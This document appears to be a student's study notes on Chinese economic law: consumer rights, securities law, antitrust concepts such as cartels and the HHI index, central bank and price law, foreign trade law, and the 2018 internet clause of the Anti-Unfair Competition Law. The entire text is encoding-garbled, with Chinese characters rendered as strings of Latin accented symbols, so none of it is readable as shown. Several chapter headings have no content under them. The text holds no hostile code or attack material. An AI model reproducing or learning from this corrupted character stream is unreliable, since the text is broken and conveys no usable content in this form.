å®‰å…¨æƒï¼šäººèº«å®‰å…¨æƒï¼›è´¢äº§å®‰å…¨æƒã€‚ çŸ¥æƒ…æƒï¼šäº†è§£å•†å“å’ŒæœåŠ¡çš„çœŸå®æƒ…å†µçš„æƒåˆ©ï¼›äº†è§£ç›¸å…³æƒ…å†µçš„æƒåˆ©ã€‚ é€‰æ‹©æƒã€‚ å…¬å¹³äº¤æ˜“æƒï¼šåŠŸèƒ½é½å¤‡ï¼Œå®šä»·åˆç†ï¼Œè®¡é‡å‡†ç¡®ï¼Œäº¤æ˜“è‡ªæ„¿ã€‚ ç´¢èµ”æƒï¼šä¹Ÿç§°ä¾æ³•æ±‚å¿æƒã€‚ ä¾æ³•ç»“ç¤¾æƒã€‚ æ¥å—æ•™è‚²æƒã€‚ å—å°Šé‡æƒã€‚ ç›‘ç£æƒã€‚    ç¬¬3èŠ‚ ç»è¥è€…ä¹‰åŠ¡ #   ä¸»è¦æœ‰æ³•å¾‹è§„å®šçš„æ³•å®šä¹‰åŠ¡ï¼ŒåŸºäºåˆåŒäº§ç”Ÿçš„çº¦å®šä¹‰åŠ¡ä¸¤ç±»ã€‚ æ ¹æ®ã€Šæ¶ˆè´¹è€…æƒç›Šä¿æŠ¤æ³•ã€‹ï¼Œç»è¥è€…ä¹‰åŠ¡ä¸»è¦åŒ…æ‹¬ï¼š  ä¾ç…§æ³•å®šæˆ–è€…çº¦å®šæä¾›å•†å“æˆ–æœåŠ¡çš„ä¹‰åŠ¡ æ¥å—ç›‘ç£ä¹‰åŠ¡ ä¿è¯å•†å“å’ŒæœåŠ¡å®‰å…¨ä¹‰åŠ¡ æä¾›çœŸå®ä¿¡æ¯ä¹‰åŠ¡ æ ‡æ˜çœŸå®èº«ä»½ä¹‰åŠ¡ å‡ºå…·è´­è´§å‡­è¯æˆ–æœåŠ¡å•æ®ä¹‰åŠ¡ å“è´¨ä¿éšœä¹‰åŠ¡ å”®åæœåŠ¡ä¹‰åŠ¡ ä¸å¾—ä»¥ä¸æ­£å½“æ–¹å¼è‡ªæˆ‘å…è´£ä¹‰åŠ¡ ä¸å¾—ä¾µçŠ¯æ¶ˆè´¹è€…äººèº«æƒä¹‰åŠ¡    ç¬¬åä¸‰ç«  äº§å“è´¨é‡æ³• #  ç¬¬åå››ç«  é£Ÿå“å®‰å…¨æ³• #  ç¬¬åäº”ç«  æˆ¿åœ°äº§æ³• #  ç¬¬åå…­ç«  å»ºç­‘æ³• #  ç¬¬åå…«ç«  è¯åˆ¸æ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ è¯åˆ¸ä¸è¯åˆ¸æ³• #   è¯åˆ¸çš„æ¦‚å¿µ  ç»æµå­¦ä¸Šçš„è¯åˆ¸ï¼šä¸€ç§é‡‘èèµ„äº§ï¼Œä¸€ç§ä¿¡ç”¨å‡­è¯æˆ–è€…é‡‘èå·¥å…·ï¼Œæ˜¯è¯æ˜è¯åˆ¸æŒæœ‰äººæœ‰æƒæŒ‰å…¶æ‰€è½½å†…å®¹å–å¾—æ”¶ç›Šçš„ä¹¦é¢è¯æ˜ã€‚  ä¾å…¶æ€§è´¨ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼šè¯æ®è¯åˆ¸ã€å‡­è¯è¯åˆ¸ã€æœ‰ä»·è¯åˆ¸ã€‚   æ³•å­¦ä¸Šçš„è¯åˆ¸ï¼šä»…æŒ‡æœ‰ä»·è¯åˆ¸ã€‚ç”¨ä»¥è¡¨æ˜ç‰¹å®šæ°‘äº‹æƒåˆ©ï¼Œå³æŒ‡æ ‡æœ‰ç¥¨é¢é‡‘é¢ï¼Œè¯æ˜æŒæœ‰äººæœ‰æƒæŒ‰æœŸå–å¾—ä¸€å®šæ”¶å…¥å¹¶å¯è‡ªç”±è½¬è®©å’Œä¹°å–çš„æ‰€æœ‰æƒæˆ–å€ºåˆ¸å‡­è¯ã€‚  æŒ‰å…¶æ‰€è½½å†…å®¹ä¸åŒï¼Œåˆå¯åˆ†ä¸ºä¸‰ç±»ï¼šè´§å¸è¯åˆ¸ã€è´§ç‰©è¯åˆ¸ã€èµ„æœ¬è¯åˆ¸ã€‚   è¯åˆ¸æ³•ä¸Šçš„è¯åˆ¸ï¼šä»…æŒ‡æœ‰ä»·è¯åˆ¸ä¸­çš„èµ„æœ¬è¯åˆ¸ã€‚ è¯åˆ¸çš„ç§ç±»ï¼š(1)è‚¡ç¥¨; (2)å€ºåˆ¸; (3)åŸºé‡‘ä»½é¢; (4)è¡ç”Ÿè¯åˆ¸ã€‚   è¯åˆ¸æ³•ï¼ˆå¹¿ä¹‰ï¼‰ï¼šæŒ‡è°ƒæ•´è¯åˆ¸å…³ç³»ä»¥åŠè¯åˆ¸è¡Œä¸ºçš„æ‰€æœ‰æ³•å¾‹è§„èŒƒæˆ–è§„åˆ™çš„æ€»ç§°ã€‚  è¯åˆ¸æ³•è°ƒæ•´å¯¹è±¡ï¼šè¯åˆ¸å‘è¡Œã€è¯åˆ¸äº¤æ˜“ã€è¯åˆ¸æœåŠ¡ã€è¯åˆ¸ç›‘ç®¡ã€è¯åˆ¸å¸æ³•ç­‰æ³•å¾‹å…³ç³»ã€‚ è¯åˆ¸æ³•çš„åŸºæœ¬åŸåˆ™ï¼š  ä¿æŠ¤ä¸­å°æŠ•èµ„è€…åŸåˆ™ â€œä¸‰å…¬åŸåˆ™â€ï¼šå…¬å¼€ã€å…¬å¹³ã€å…¬æ­£ã€‚ åæ¬ºè¯ˆåŸåˆ™ï¼ˆAntifraud Doctrineï¼‰      ç¬¬2èŠ‚ è¯åˆ¸å¸‚åœºä¸»ä½“ #   è¯åˆ¸äº¤æ˜“æ‰€ï¼šä¹°å–è‚¡ç¥¨ã€å…¬å¸å€ºã€å…¬å€ºç­‰æœ‰ä»·è¯åˆ¸çš„å¸‚åœºã€‚ è¯åˆ¸å¸‚åœºä¸­ä»‹æœºæ„ï¼šæŒ‡ä¸ºè¯åˆ¸çš„å‘è¡Œä¸äº¤æ˜“æä¾›æœåŠ¡ï¼Œæ²Ÿé€šè¯åˆ¸æŠ•èµ„äººä¸ç­¹é›†äººä¹‹é—´å…³ç³»çš„å„ç±»ä¸­ä»‹æœåŠ¡æœºæ„ï¼Œæ˜¯è¯åˆ¸å¸‚åœºè¿è¡Œçš„ç»„ç»‡ç³»ç»Ÿã€‚  è¯åˆ¸å…¬å¸ï¼šä¿—ç§°åˆ¸å•†ï¼ˆsecurities firms, securities tradesï¼‰ è¯åˆ¸ç™»è®°ç»“ç®—æœºæ„ è¯åˆ¸æŠ•èµ„å’¨è¯¢æœºæ„ è¯åˆ¸èµ„ä¿¡è¯„çº§æœºæ„ å…¶ä»–è¯åˆ¸æœåŠ¡æœºæ„    ç¬¬3èŠ‚ è¯åˆ¸å‘è¡Œ #   è¯åˆ¸å‘è¡Œï¼šæ”¿åºœã€é‡‘èæœºæ„ã€å·¥å•†ä¼ä¸šç­‰ä»¥å‹Ÿé›†èµ„é‡‘ä¸ºç›®çš„å‘æŠ•èµ„è€…å‡ºå”®ä»£è¡¨ä¸€å®šæƒåˆ©çš„æœ‰ä»·è¯åˆ¸çš„æ´»åŠ¨ã€‚  ç¬¬åä¹ç«  ä¿é™©ä¸šç›‘ç£ç®¡ç†æ³• #  ç¬¬ä¸‰ç¼–è¯¾å ‚ç¬”è®° #  DAY SEVEN #   åå„æ–­ï¼šæ˜¯æŒ‡å½“ä¸€ä¸ªå…¬å¸çš„è¥é”€å‘ˆç°å„æ–­æˆ–æœ‰å„æ–­è¶‹åŠ¿çš„æ—¶å€™ï¼Œå›½å®¶æ”¿åºœæˆ–å›½é™…ç»„ç»‡çš„ä¸€ç§å¹²é¢„æ‰‹æ®µã€‚ å¸‚åœºçš„æ„æˆï¼šç”Ÿäº§å•†â†’é”€å”®å•†â†’æ¶ˆè´¹è€… å„æ–­åè®®ï¼šæ¨ªå‘åè®®ä¸çºµå‘åè®®ã€‚ è±å…ï¼šæœ¬åº”é€‚ç”¨åå„æ–­æ³•ï¼Œä½†åŸºäºæŸç§åŸå› æ’é™¤é€‚ç”¨ã€‚  éœ€è¦è¯æ˜æ¶ˆè´¹è€…å¯ä»¥è·å¾—å„æ–­åè®®çš„åˆ©ç›Šã€‚ è¿™åæ˜ åˆ°æ³•å¾‹ä¸Šå°±æ˜¯ç”±â€œç»“æ„ä¸»ä¹‰â€åˆ°â€œè¡Œä¸ºä¸»ä¹‰â€çš„è½¬å˜ã€‚   å„æ–­ç»„ç»‡ï¼šå„æ–­ç»„ç»‡æ˜¯æŒ‡åœ¨èµ„æœ¬ä¸»ä¹‰ç¤¾ä¼šçš„ä¸€ä¸ªæˆ–å‡ ä¸ªç»æµéƒ¨é—¨ä¸­å±…äºé‡è¦åœ°ä½çš„å¤§ä¼ä¸šä¹‹é—´çš„è”åˆã€‚  å¡ç‰¹å°”ã€è¾›è¿ªåŠ ã€æ‰˜æ‹‰æ–¯ã€åº·é‡‡æ©æ˜¯å„æ–­ç»„ç»‡çš„å››ç§ä¸»è¦å½¢å¼ã€‚ å¡ç‰¹å°”æ˜¯æœ€æ—©å‡ºç°çš„ã€ä¹Ÿæ˜¯æœ€ç®€å•çš„å„æ–­ç»„ç»‡å½¢å¼ã€‚å®ƒæ˜¯ç”Ÿäº§åŒç±»å•†å“çš„å¤§ä¼ä¸šï¼Œé€šè¿‡ç­¾è®¢å…³äºäº§å“ä»·æ ¼ã€é”€å”®å¸‚åœºã€ç”Ÿäº§è§„æ¨¡ç­‰åå®šè€Œå»ºç«‹çš„å„æ–­ç»„ç»‡ã€‚ è¾›è¿ªåŠ æ˜¯åŒä¸€ç”Ÿäº§éƒ¨é—¨çš„å°‘æ•°å¤§ä¼ä¸šé€šè¿‡ç­¾è®¢å…³äºé”€å”®å•†å“å’Œé‡‡è´­åŸæ–™çš„åå®šè€Œå»ºç«‹çš„å„æ–­ç»„ç»‡ã€‚å‚åŠ è¾›è¿ªåŠ çš„ä¼ä¸šï¼Œå…¶å•†å“é”€å”®ã€åŸæ–™è´­ä¹°ï¼Œéƒ½å¿…é¡»ç”±æ€»åŠäº‹å¤„ç»Ÿä¸€åŠç†ã€‚ æ‰˜æ‹‰æ–¯æ˜¯ç”±è‹¥å¹²ç”Ÿäº§åŒç±»å•†å“çš„å¤§ä¼ä¸šæˆ–äº§å“æœ‰å¯†åˆ‡è”ç³»çš„å¤§ä¼ä¸šäº’ç›¸è”åˆè€Œç»„æˆçš„å„æ–­ç»„ç»‡ã€‚åœ¨æ‰˜æ‹‰æ–¯å†…ï¼Œä¸€åˆ‡æœ‰å…³ç”Ÿäº§ã€é”€å”®å’Œè´¢åŠ¡ç­‰ç­‰ä¸šåŠ¡ï¼Œå‡ç”±æ‰˜æ‹‰æ–¯ç†äº‹ä¼šç»Ÿä¸€å¤„ç†ï¼Œè€ŒåŸæ¥çš„ä¼ä¸šä¸»åˆ™æˆä¸ºæ‰˜æ‹‰æ–¯çš„è‚¡ä¸œã€‚ åº·é‡‡æ©æ˜¯ç”±ä¸åŒç»æµéƒ¨é—¨çš„è®¸å¤šå¤§ä¼ä¸šè”åˆç»„æˆçš„å„æ–­ç»„ç»‡ã€‚å‚åŠ åº·é‡‡æ©çš„æ—¢æœ‰å•ä¸ªçš„ä¼ä¸šï¼Œåˆæœ‰å…¶ä»–çš„å„æ–­ç»„ç»‡å¦‚è¾›è¿ªåŠ ã€æ‰˜æ‹‰æ–¯;æ—¢æœ‰å·¥ä¸šä¼ä¸šï¼Œåˆæœ‰å•†ä¸šä¼ä¸šã€äº¤é€šè¿è¾“ä¼ä¸šä»¥åŠé“¶è¡Œå’Œä¿é™©å…¬å¸ç­‰ã€‚å…¶ä¸­æœ€å¤§çš„é“¶è¡Œæˆ–ä¼ä¸šåˆ™æ˜¯è¿™ä¸ªåºå¤§å¤æ‚ç»„ç»‡çš„æ ¸å¿ƒã€‚      DAY EIGHT #   åå„æ–­æ³•ç¦æ­¢çš„è¡Œä¸º ç»è¥è€…é›†ä¸­ ç»è¥è€…é›†ä¸­çš„å®¡æŸ¥è€ƒè™‘çš„å› ç´ ï¼š  å‚ä¸é›†ä¸­çš„ç»è¥è€…åœ¨ç›¸å…³å¸‚åœºçš„å¸‚åœºä»½é¢ä»¥åŠå…¶å¯¹å¸‚åœºçš„æ§åˆ¶åŠ›ï¼› ç›¸å…³å¸‚åœºçš„å¸‚åœºé›†ä¸­åº¦ï¼› ç»è¥è€…é›†ä¸­å¯¹å¸‚åœºè¿›å…¥ã€æŠ€æœ¯è¿›æ­¥çš„å½±å“ï¼› ç»è¥è€…é›†ä¸­å¯¹æ¶ˆè´¹è€…å’Œå…¶ä»–æœ‰å…³ç»è¥è€…çš„å½±å“ï¼› ç»è¥è€…é›†ä¸­å¯¹å›½æ°‘ç»æµå‘å±•çš„å½±å“ï¼› å›½åŠ¡é™¢åå„æ–­æ‰§æ³•æœºæ„è®¤ä¸ºçš„å…¶ä»–å› ç´ ã€‚    DAY NINE #   å¸‚åœºé›†ä¸­åº¦ï¼šå¯¹ç›¸å…³å¸‚åœºçš„ç»“æ„æ‰€åšçš„ä¸€ç§æè¿°ï¼Œä½“ç°ç›¸å…³å¸‚åœºå†…ç»è¥è€…çš„é›†ä¸­ç¨‹åº¦ã€‚æœ‰ä¸¤ç§æµ‹å®šæ–¹æ³•ï¼š  èµ«èŠ¬è¾¾æŒ‡æ•°ï¼ˆHHIæŒ‡æ•°ï¼‰ï¼šé›†ä¸­è®¾è®¡ç›¸å…³å¸‚åœºä¸­æ¯ä¸ªç»è¥è€…çš„å¸‚åœºä»½é¢å¹³æ–¹å’Œï¼› è¡Œä¸šé›†ä¸­åº¦æŒ‡æ•°ï¼ˆRnæŒ‡æ•°ï¼‰ï¼šå‰nä¸ªä¼ä¸šå¸‚åœºä»½é¢çš„å’Œ   åˆ†æï¼šå•è¾¹æ•ˆåº”åˆ†æï¼ŒååŒæ•ˆåº”åˆ†æã€‚  DAY ELEVEN #   åå„æ–­æ³•ä¸åä¸æ­£å½“ç«äº‰æ³•çš„åŒºåˆ«ï¼Ÿ å‰è€…ç›®çš„ä¸ºè¿½æ±‚è‡ªç”±ç«äº‰ã€ä¿æŠ¤ç«äº‰ç§©åºï¼›åè€…åå¯¹ä¸æ­£å½“ç«äº‰ï¼Œå‰ææ˜¯å¸‚åœºå­˜åœ¨ç«äº‰ã€‚ å‰è€…çš„ä¸»ä½“æœ‰ä¾æ³•å‚ä¸ç«äº‰çš„æƒåŠ›ï¼›åè€…ä¸»ä½“åˆ™æœ‰ä¾æ³•ä»äº‹æ­£å½“ç«äº‰çš„ä¹‰åŠ¡ã€‚ å‰è€…è¡Œä¸ºæ–¹æ³•ä¸»è¦ä»¥ç»è¥è€…å…±è°‹ã€åŒè°‹ã€åˆè°‹æ§åˆ¶å¸‚åœºï¼Œæ’é™¤ã€é™åˆ¶ç«äº‰ä¸ºç‰¹ç‚¹ï¼›åè€…åˆ™æ›´åŠ å¤šæ ·ã€‚ å‰è€…å¸¸è¡¨ç°ä¸ºåˆåŒè¡Œä¸ºï¼›åè€…åˆ™å®šæ€§ä¸ºä¾µæƒè¡Œä¸ºã€‚ å‰è€…å¼ºè°ƒå›½å®¶ï¼Œè¡Œæ”¿æœºå…³ä¸»åŠ¨å¹²é¢„ï¼›åè€…åˆ™ä¾µçŠ¯ç§äººåˆ©ç›Šï¼Œä¸»è¦é€šè¿‡è¯‰è®¼è§£å†³ã€‚ å‰è€…é€šå¸¸ä¸ºäº‹å‰ç®¡ç†ï¼Œä¸»è¦è¿ç”¨è¡Œæ”¿æ‰‹æ®µï¼Œå¤„ç½šåŠ›åº¦å¤§ï¼›åè€…è§„åˆ¶çš„è¡Œä¸ºé€šå¸¸å·²ç»å®æ–½æˆ–ç»“æŸåçš„æ•‘æµï¼Œè´£ä»»ä¸ºäº‹åè´£ä»»ã€‚    ç¬¬äºŒåç«  è´¢æ”¿æ³• #  ç¬¬äºŒåä¸€ç«  æ”¿åºœé‡‡è´­æ³• #  ç¬¬äºŒåäºŒç«  ä¸­å¤®é“¶è¡Œæ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ ä¸­å¤®é“¶è¡Œæ³•æ¦‚è¿° #   ä¸­å¤®é“¶è¡Œï¼šä¾æ³•åˆ¶å®šå’Œæ‰§è¡Œå›½å®¶è´§å¸æ”¿ç­–ï¼Œè°ƒæ§è´§å¸æµé€šå’Œä¿¡ç”¨æ´»åŠ¨ï¼Œå®æ–½é‡‘èç›‘ç®¡çš„ç‰¹æ®Šé‡‘èæœºæ„ã€‚  ä¸­å¤®é“¶è¡Œçš„äº§ç”ŸåŸºäºä»¥ä¸‹å››ç‚¹åŸå› ï¼š\r1. æ»¡è¶³è´§å¸å‘è¡Œçš„éœ€è¦\r2. æ»¡è¶³æ”¿åºœèèµ„çš„éœ€è¦\r3. ä¸ºæ»¡è¶³ç¥¨æ®æ¸…ç®—å’Œå……å½“æœ€åè´·æ¬¾äººçš„éœ€è¦\r4. æ»¡è¶³é‡‘èç›‘ç®¡å’Œé‡‘èè°ƒæ§çš„éœ€è¦\r ä¸­å¤®é“¶è¡Œæ³•ï¼šå…³äºä¸­å¤®é“¶è¡Œçš„ç»„ç»‡å’ŒèŒè´£çš„æ³•å¾‹è§„èŒƒçš„æ€»ç§°  ç¬¬3èŠ‚ ä¸­å¤®é“¶è¡Œçš„æ³•å®šèŒè´£ #   è´§å¸æ”¿ç­–ï¼š  è´§å¸æ”¿ç­–ç›®æ ‡ï¼šè´§å¸æ”¿ç­–ç›®æ ‡æ˜¯ä¸­å¤®é“¶è¡Œåˆ¶å®šå’Œæ‰§è¡Œæ”¿ç­–æ‰€è¦è¾¾åˆ°çš„æœ€ç»ˆç›®æ ‡ã€‚ è´§å¸æ”¿ç­–å·¥å…·ï¼šä¸€èˆ¬æ€§è´§å¸æ”¿ç­–å·¥å…·ã€é€‰æ‹©æ€§è´§å¸æ”¿ç­–å·¥å…·ã€ç›´æ¥è´§å¸æ”¿ç­–å·¥å…·ã€‚   é‡‘èç›‘ç®¡  ç¬¬äºŒåä¸‰ç«  ç¨æ³• #  ç¬¬äºŒåå››ç«  ä»·æ ¼æ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ æ¦‚è¿° #   ä»·æ ¼æ³•ï¼šè°ƒæ•´ä»·æ ¼ä¸»ä½“çš„ä»·æ ¼è¡Œä¸ºä»¥åŠå› ä»·æ ¼è¡Œä¸ºæ‰€äº§ç”Ÿçš„ç»æµå…³ç³»çš„æ³•å¾‹è§„èŒƒçš„æ€»ç§°ã€‚  ç«‹æ³•ç›®çš„ï¼šå‘æŒ¥ä»·æ ¼åˆç†é…ç½®èµ„æºçš„ä½œç”¨ï¼Œç¨³å®šå¸‚åœºä»·æ ¼æ€»æ°´å¹³ï¼Œä¿æŠ¤æ¶ˆè´¹è€…å’Œç»è¥è€…çš„åˆæ³•æƒç›Šï¼Œä¿ƒè¿›ç¤¾ä¼šä¸»ä¹‰å¸‚åœºç»æµå¥åº·å‘å±•ã€‚ ä»·æ ¼ä¸»ä½“ï¼šå®šä»·ä¸»ä½“ã€ä»·æ ¼ç›‘ç®¡ã€ä»·æ ¼è°ƒæ§ä¸»ä½“ã€‚ æ„æˆå†…å®¹ï¼šä»·æ ¼è¡Œä¸ºã€ä»·æ ¼ç›‘ç®¡ã€ä»·æ ¼æ€»æ°´å¹³è°ƒæ§ã€ä»·æ ¼è¿æ³•è¡Œä¸ºä»¥åŠå…¶æ³•å¾‹è´£ä»»ã€‚    ç¬¬2èŠ‚ ç»è¥è€…çš„ä»·æ ¼è¡Œä¸º #   ç»è¥è€…ï¼šä¾æ³•å–å¾—ç»è¥èµ„æ ¼çš„åˆæ³•ç»è¥è€…ã€‚ ç»è¥è€…å®šä»·åŸåˆ™ï¼š(1)å…¬å¹³åŸåˆ™; (2)åˆæ³•åŸåˆ™; (3)åŸå¸‚å®ˆä¿¡åŸåˆ™ã€‚ ç»è¥è€…å®šä»·ä¾æ®ï¼šç”Ÿäº§ç»è¥æˆæœ¬å’Œå¸‚åœºä¾›æ±‚çŠ¶å†µã€‚ ç»è¥è€…å®šä»·æƒåˆ©ï¼š  å¸‚åœºè°ƒèŠ‚ä»·çš„è‡ªä¸»å®šä»·æƒã€‚å¸‚åœºè°ƒèŠ‚ä»·ï¼šç”±ç»è¥è€…è‡ªä¸»åˆ¶å®šï¼Œé€šè¿‡å¸‚åœºç«äº‰å½¢æˆçš„ä»·æ ¼ã€‚ æ”¿åºœæŒ‡å¯¼ä»·å†…çš„å®šä»·æƒã€‚æ”¿åºœæŒ‡å¯¼ä»·ï¼šæŒ‡ä¾ç…§ä»·æ ¼æ³•è§„å®šï¼Œç”±æ”¿åºœä»·æ ¼ä¸»ç®¡éƒ¨é—¨æˆ–å…¶ä»–æœ‰å…³éƒ¨é—¨ï¼ŒæŒ‰ç…§å®šä»·æƒé™å’ŒèŒƒå›´è§„å®šåŸºå‡†ä»·åŠå…¶æµ®åŠ¨å¹…åº¦æŒ‡å¯¼ç»è¥è€…åˆ¶å®šçš„ä»·æ ¼ã€‚ æ–°äº§å“è¯•é”€çš„å®šä»·æƒã€‚ ä»·æ ¼ä¾µçŠ¯çš„æ•‘æµæƒã€‚   ç»è¥è€…å®šä»·ä¹‰åŠ¡ï¼š(1)åˆ¶å®šåˆç†ä»·æ ¼ä¹‰åŠ¡; (2)å¥å…¨å†…éƒ¨ç®¡ç†åˆ¶åº¦ä¹‰åŠ¡; (3)ä¾æ³•è¿›è¡Œä»·æ ¼è¡Œä¸ºä¹‰åŠ¡; (4)æ˜ç æ ‡ä»·ä¹‰åŠ¡ã€‚ ç»è¥è€…çš„ä¸æ­£å½“ä»·æ ¼è¡Œä¸ºï¼š  ç›¸äº’ä¸²é€šæ“çºµå¸‚åœºçš„ä»·æ ¼è¡Œä¸º ä½ä»·å€¾é”€è¡Œä¸º å“„æŠ¬ä»·æ ¼è¡Œä¸º ä»·æ ¼æ¬ºè¯ˆè¡Œä¸º ä»·æ ¼æ­§è§†è¡Œä¸º å˜ç›¸æé«˜æˆ–è€…å‹ä½ä»·æ ¼è¡Œä¸º è°‹å–æš´åˆ©è¡Œä¸º    ç¬¬3èŠ‚ æ”¿åºœä»·æ ¼è¡Œä¸º #   æ”¿åºœçš„å®šä»·è¡Œä¸º  æ”¿åºœçš„å®šä»·ä¾æ®ï¼šåŸºæœ¬ä¾æ®æ˜¯å•†å“å’ŒæœåŠ¡çš„ç¤¾ä¼šå¹³å‡æˆæœ¬ï¼Œè¿˜æœ‰å¸‚åœºä¾›æ±‚çŠ¶å†µï¼Œå›½æ°‘ç»æµä¸ç¤¾ä¼šå‘å±•è¦æ±‚ä»¥åŠç¤¾ä¼šæ‰¿å—èƒ½åŠ›ï¼Œç¤¾ä¼šæ‰¿å—èƒ½åŠ›ï¼Œåˆç†çš„å·®ä»·ã€‚ å®šä»·èŒƒå›´ï¼š  äº‹å…³å›½è®¡æ°‘ç”Ÿçš„æå°‘æ•°å•†å“ä»·æ ¼ï¼› èµ„æºç¨€ç¼ºçš„å°‘æ•°å•†å“ä»·æ ¼ï¼› è‡ªç„¶å„æ–­ç»è¥çš„å•†å“ä»·æ ¼ï¼› é‡è¦çš„å…¬ç”¨äº‹ä¸šä»·æ ¼ï¼› é‡è¦çš„å…¬ç›Šæ€§æœåŠ¡ä»·æ ¼ã€‚     æ”¿åºœçš„ä»·æ ¼è°ƒæ§è¡Œä¸º  é‡è¦å•†å“å‚¨å¤‡åˆ¶åº¦ ä»·æ ¼è°ƒèŠ‚åŸºé‡‘åˆ¶åº¦ ä»·æ ¼ç›‘æµ‹åˆ¶åº¦ ä»·æ ¼å¹²é¢„æªæ–½    ç¬¬äºŒåäº”ç«  å¯¹å¤–è´¸æ˜“æ³•ï¼Œæ³•æ¡ #  ç¬¬1èŠ‚ å¯¹å¤–è´¸æ˜“æ³•æ¦‚è¿° #   å¯¹å¤–è´¸æ˜“ï¼šæ˜¯æŒ‡ä¸€å›½æˆ–è€…åœ°åŒºåŒå…¶ä»–å›½å®¶æˆ–åœ°åŒºé—´è¿›è¡Œè´§ç‰©ã€æŠ€æœ¯æˆ–æœåŠ¡äº¤æ¢çš„ä¸€ç§ç»æµæ´»åŠ¨ã€‚ ä¿ƒè¿›å¯¹å¤–è´¸æ˜“æ˜¯å½“ä»Šä¸–ç•Œä¸–ç•Œç»æµå‘å±•çš„å¿…ç„¶è¦æ±‚ã€‚ æˆ‘å›½ã€Šå¯¹å¤–è´¸æ˜“æ³•ã€‹çš„åŸåˆ™ï¼š  å®è¡Œç»Ÿä¸€çš„å¯¹å¤–ç»è´¸åˆ¶åº¦ï¼Œç»´æŠ¤å¤–è´¸ç§©åºçš„åŸåˆ™ã€‚ é¼“åŠ±å‘å±•å¯¹å¤–è´¸æ˜“ï¼Œä¿éšœå¯¹å¤–è´¸æ˜“ç»è¥è€…çš„åˆæ³•æƒç›Šçš„åŸåˆ™ã€‚ å¹³ç­‰äº’åˆ©çš„åŸåˆ™ã€‚ äº’æƒ å¯¹ç­‰åŸåˆ™å’Œæœ€æƒ å›½ã€å›½æ°‘å¾…é‡åŸåˆ™ã€‚    ç¬¬äºŒåå…­ç«  å®¡è®¡æ³• #  FINAL-REVIEW #   æ–°ä¿®æ”¹ã€Šåä¸æ­£å½“ç«äº‰æ³•ã€‹ ã€Šä¸­åäººæ°‘å…±å’Œå›½åä¸æ­£å½“ç«äº‰æ³•ã€‹2018ä¿®è®¢ç›¸å¯¹1993å¹´åˆ†æ? å…³äºäº’è”ç½‘çš„ä¸æ­£å½“ç«äº‰æ¡æ¬¾ï¼š  æ–°å¢æ³•æ¡ï¼š  ç¬¬åäºŒæ¡ã€€ç»è¥è€…åˆ©ç”¨ç½‘ç»œä»äº‹ç”Ÿäº§ç»è¥æ´»åŠ¨ï¼Œåº”å½“éµå®ˆæœ¬æ³•çš„å„é¡¹è§„å®šã€‚\rç»è¥è€…ä¸å¾—åˆ©ç”¨æŠ€æœ¯æ‰‹æ®µï¼Œé€šè¿‡å½±å“ç”¨æˆ·é€‰æ‹©æˆ–è€…å…¶ä»–æ–¹å¼ï¼Œå®æ–½ä¸‹åˆ—å¦¨ç¢ã€ç ´åå…¶ä»–ç»è¥è€…åˆæ³•æä¾›çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡æ­£å¸¸è¿è¡Œçš„è¡Œä¸ºï¼š\rï¼ˆä¸€ï¼‰æœªç»å…¶ä»–ç»è¥è€…åŒæ„ï¼Œåœ¨å…¶åˆæ³•æä¾›çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡ä¸­ï¼Œæ’å…¥é“¾æ¥ã€å¼ºåˆ¶è¿›è¡Œç›®æ ‡è·³è½¬ï¼›\rï¼ˆäºŒï¼‰è¯¯å¯¼ã€æ¬ºéª—ã€å¼ºè¿«ç”¨æˆ·ä¿®æ”¹ã€å…³é—­ã€å¸è½½å…¶ä»–ç»è¥è€…åˆæ³•æä¾›çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡ï¼›\rï¼ˆä¸‰ï¼‰æ¶æ„å¯¹å…¶ä»–ç»è¥è€…åˆæ³•æä¾›çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡å®æ–½ä¸å…¼å®¹ï¼›\rï¼ˆå››ï¼‰å…¶ä»–å¦¨ç¢ã€ç ´åå…¶ä»–ç»è¥è€…åˆæ³•æä¾›çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡æ­£å¸¸è¿è¡Œçš„è¡Œä¸ºã€‚\r- åˆ†æï¼šç”±äºç°è¡Œæ³•æ²¡æœ‰å…³äºäº’è”ç½‘ç«äº‰çš„è§„å®šï¼Œæœ‰çš„äº’è”ç½‘å…¬å¸ç”šè‡³è´¨ç–‘åä¸æ­£å½“ç«äº‰æ³•åœ¨äº’è”ç½‘é¢†åŸŸçš„é€‚ç”¨ã€‚äº’è”ç½‘é¢†åŸŸå†…çš„ä¸æ­£å½“ç«äº‰è¡Œä¸ºä¸ä½†å¯¹äº’è”ç½‘ä¼ä¸šé€ æˆå½±å“ï¼Œè€Œä¸”å¯¹å¹¿å¤§æ¶ˆè´¹è€…çš„é€‰æ‹©é€ æˆå¹²æ‰°ï¼Œå¦‚å¸æ³•é¢†åŸŸå·²åˆ¤å†³çš„ï¼“ï¼±å¤§æˆ˜ç­‰ã€‚\r- å›½å®¶å·¥å•†æ€»å±€ç«äº‰æ‰§æ³•å±€å‰¯å±€é•¿æ¡‘æ—è¯´ï¼Œäº’è”ç½‘é¢†åŸŸçš„ä¸æ­£å½“ç«äº‰ä¼ æ’­å¿«ã€å½±å“å¤§ã€æ˜“å¤åˆ¶ã€‚å„çº§å·¥å•†æœºå…³ä¹Ÿé™†ç»­æ¥åˆ°å¤šèµ·åŸºäºäº’è”ç½‘æŠ€æœ¯å¼•å‘çš„ä¸æ­£å½“ç«äº‰é—®é¢˜æŠ•è¯‰ï¼Œä½†å› ä¸ºç°è¡Œæ³•å¾‹æ— æ˜ç¡®è§„å®šï¼Œä¸èƒ½æœ‰æ•ˆå‘æŒ¥è¡Œæ”¿æ‰§æ³•éƒ¨é—¨çš„èŒèƒ½ã€‚\r- 